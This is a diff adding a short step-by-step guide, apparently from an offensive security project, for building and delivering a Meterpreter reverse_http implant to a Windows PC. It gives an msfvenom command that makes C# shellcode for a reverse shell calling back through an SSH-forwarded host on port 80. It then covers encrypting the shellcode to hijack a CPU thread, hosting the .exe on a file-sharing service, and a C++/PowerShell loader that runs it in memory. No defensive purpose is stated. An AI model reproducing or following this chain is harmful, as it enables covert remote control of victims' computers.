@@ -1,0 +1,29 @@
+Configuring the payload 
+
+1. Using SSH to implement a port forwarding setup from an online 
+provider to the localhost of the attacker’s kali machine. 
+The SSH credentials from the provider is used in the payload, that is 
+the  ‘lhost’ address and the port used is 80 
+
+This will forward all the data from the payload to the attacker kali 
+machine 
+
+1. msfvenom in Kali Linux is used to create the payload  
+msfvenom -p windows/x64/meterpreter/reverse_http lhost=’xxxx’ 
+lport=80 -f csharp 
+The payload  used is 64 bit “reverse_http” of meterpreter (as specified 
+after “-p”) 
+Listener address :<From the online provider> 
+Listener port:80 (a standard http port) 
+The output is a csharp shellcode file 
+
+2.The csharp shellcode is encrypted and configured it to hijack a CPU 
+thread,then its .exe file is compiled 
+
+3.The .exe file is uploaded to any file hosting service which provides the 
+direct download link to the file 
+
+4.A C++ program is written and compiled to another .exe which runs the 
+powershell script to load the malicious .exe file directly from the file 
+hosting service to the windows pc’s memory 
+Alternatively, an equivalent batch script can also be written 
